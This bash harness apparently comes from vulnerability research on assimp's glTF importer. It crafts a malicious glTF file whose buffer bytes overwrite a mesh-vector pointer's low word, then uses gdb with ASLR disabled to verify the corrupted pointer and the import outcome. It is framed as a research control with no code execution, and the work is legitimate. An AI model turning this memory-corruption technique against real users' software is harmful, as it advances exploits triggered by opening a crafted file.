#!/usr/bin/env bash
# W18: a clean-import control for the W14 low-word overwrite. W14 wrote the
# low word captured from safe.gltf (5556f520) into the crafted document, but
# the crafted document's OWN vector begins elsewhere (55770210 in this tree):
# its "restoration" case never restored the live pointer. Here I measure the
# crafted document's own begin before the index overwrite, write THAT low word
# back through the same vulnerable accessor path, and check the live pointer
# at CopyVector and the import outcome. ASLR-off gdb is a stated condition;
# the plain ASLR-on run is recorded as a negative. No r5, no chosen code.
set -euo pipefail
cd "$(dirname "$0")/.."

src=pins/assimp-6.0.6
driver=harness/bin/w12_o2
if [ ! -x "$driver" ]; then
    bash harness/run-w12.sh >/dev/null
fi
mkdir -p w18/evidence
trace=w18/evidence/w18.trace
log=w18/evidence/w18.log
: >"$trace"
: >"$log"

pass=0
fail=0
check() { # name, required substring
    if grep -qF -- "$2" "$trace"; then
        printf 'PASS %s\n' "$1" | tee -a "$log"
        pass=$((pass + 1))
    else
        printf 'FAIL %s (missing: %s)\n' "$1" "$2" | tee -a "$log"
        fail=$((fail + 1))
    fi
}

sha256sum "$src/code/AssetLib/glTF/glTFAsset.inl" \
          "$src/code/AssetLib/glTF/glTFImporter.cpp" >w18/evidence/source-hashes.out
cat w18/evidence/source-hashes.out >>"$trace"

pre_bp="$PWD/$src/code/AssetLib/glTF/glTFImporter.cpp:314"   # before index read
copy_bp="$PWD/$src/code/AssetLib/glTF/glTFImporter.cpp:475"  # CopyVector call

# Measure the crafted document's OWN live vector before corruption, twice;
# a mismatch makes the control unsound and must fail rather than be calibrated.
for i in 1 2; do
    gdb -q -batch -ex 'set disable-randomization on' -ex 'set breakpoint pending on' \
        -ex "break $pre_bp" -ex run \
        -ex 'print/x meshes._M_impl._M_start' \
        -ex 'print/x meshes._M_impl._M_finish' \
        -ex 'print/x meshes._M_impl._M_end_of_storage' \
        --args "$driver" harness/cases/idxptr-mat2-real.gltf \
        >"w18/evidence/own-begin-$i.out" 2>&1 || true
done
own_begin=$(grep -oE '0x[0-9a-f]+' w18/evidence/own-begin-1.out | tail -3 | head -1 || true)
own_finish=$(grep -oE '0x[0-9a-f]+' w18/evidence/own-begin-1.out | tail -2 | head -1 || true)
own_cap=$(grep -oE '0x[0-9a-f]+' w18/evidence/own-begin-1.out | tail -1 || true)
own_begin_2=$(grep -oE '0x[0-9a-f]+' w18/evidence/own-begin-2.out | tail -3 | head -1 || true)
printf 'PRE own_begin=%s finish=%s cap=%s repeat=%s\n' \
    "$own_begin" "$own_finish" "$own_cap" "$own_begin_2" >>"$trace"
[ -n "$own_begin" ] && [ "$own_begin" = "$own_begin_2" ] && \
    printf 'PRE own_begin_stable=1\n' >>"$trace"

# Generate the control document: only document bytes 48..51 change, to the
# little-endian low word of the crafted document's own pre-corruption begin.
python3 - "$own_begin" <<'PY' >w18/evidence/generated.out
import base64, json, sys
own = int(sys.argv[1], 16)
word = own & 0xffffffff
with open("harness/cases/idxptr-mat2-real.gltf") as f:
    obj = json.load(f)
head, data = obj["buffers"]["buf"]["uri"].split(",", 1)
raw = bytearray(base64.b64decode(data))
old = bytes(raw[48:52])
raw[48:52] = word.to_bytes(4, "little")
obj["buffers"]["buf"]["uri"] = head + "," + base64.b64encode(raw).decode()
with open("w18/evidence/idxptr-mat2-ownbegin.gltf", "w") as f:
    json.dump(obj, f, indent=2)
print("old=%s word=%08x bytes=%s" % (old.hex(), word, raw[48:52].hex()))
PY
cat w18/evidence/generated.out >>"$trace"

# Control run: gdb ASLR-off, break at CopyVector, read the live pointer, then
# continue to the importer's normal exit.
gdb -q -batch -ex 'set disable-randomization on' -ex 'set breakpoint pending on' \
    -ex "break $copy_bp" -ex run \
    -ex 'print/x meshes._M_impl._M_start' \
    -ex 'print/x meshes._M_impl._M_finish' \
    -ex continue \
    --args "$driver" w18/evidence/idxptr-mat2-ownbegin.gltf \
    >w18/evidence/ownbegin-gdb.out 2>&1 || true
slot=$(grep -oE '0x[0-9a-f]+' w18/evidence/ownbegin-gdb.out | tail -2 | head -1 || true)
slot_finish=$(grep -oE '0x[0-9a-f]+' w18/evidence/ownbegin-gdb.out | tail -1 || true)
printf 'POST ownbegin_slot=%s finish=%s\n' "$slot" "$slot_finish" >>"$trace"
grep -m1 'case=.*scene=ok' w18/evidence/ownbegin-gdb.out >>"$trace" || true
grep -m1 'exited normally' w18/evidence/ownbegin-gdb.out >>"$trace" || true

# Baseline negative: W14's real.gltf writes safe.gltf's low word, which is a
# different value in this tree; its slot must differ from the crafted own begin.
gdb -q -batch -ex 'set disable-randomization on' -ex 'set breakpoint pending on' \
    -ex "break $copy_bp" -ex run -ex 'print/x meshes._M_impl._M_start' \
    --args "$driver" harness/cases/idxptr-mat2-real.gltf \
    >w18/evidence/real-slot.out 2>&1 || true
real_slot=$(grep -oE '0x[0-9a-f]+' w18/evidence/real-slot.out | tail -1 || true)
printf 'NEG real_slot=%s own_begin=%s\n' "$real_slot" "$own_begin" >>"$trace"

# Plain ASLR-on run: the live low word is not the fixed document word, so no
# clean import is expected. Recorded, not a claim of clean behavior.
rc=0
"$driver" w18/evidence/idxptr-mat2-ownbegin.gltf >w18/evidence/ownbegin-plain.out 2>&1 || rc=$?
printf 'NEG plain rc=%s\n' "$rc" >>"$trace"

check 'source hashes pinned' 'glTFAsset.inl'
check 'own begin stable across two measurements' 'PRE own_begin_stable=1'
check 'live begin restored to own begin' "POST ownbegin_slot=$own_begin"
check 'live finish unchanged' "POST ownbegin_slot=$own_begin finish=$own_finish"
check 'crafted import completes cleanly' 'scene=ok'
check 'gdb process exits normally' 'exited normally'
check 'W14 real word does not restore own begin' 'NEG real_slot=0x55555556f520'
check 'ASLR-on plain run is a negative' 'NEG plain rc=139'

printf 'TOTAL pass=%d fail=%d\n' "$pass" "$fail" >>"$trace"
sha256sum "$trace" >w18/evidence/w18.trace.sha256
cat "$trace"
[ "$fail" -eq 0 ]
